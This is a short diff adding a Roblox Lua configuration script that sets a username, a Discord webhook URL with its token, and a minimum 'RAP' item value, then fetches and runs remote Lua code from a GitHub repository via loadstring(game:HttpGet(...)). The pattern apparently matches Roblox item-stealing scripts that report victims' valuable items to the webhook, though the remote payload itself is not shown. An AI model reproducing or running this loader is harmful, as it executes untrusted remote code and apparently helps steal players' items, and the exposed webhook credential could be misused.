@@ -1,0 +1,6 @@
+Username= 'ellias_99'
+Webhook= 'https://discord.com/api/webhooks/1348975010827472937/gPUmaYpZSswPDqhucDHopQ2Qw61cgatv-spH4l7-7Oki7mGi7dmochWiL1ZtYPUxrgCf'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/KSFoster/VANHOFFHub/refs/heads/main/Lua'))()
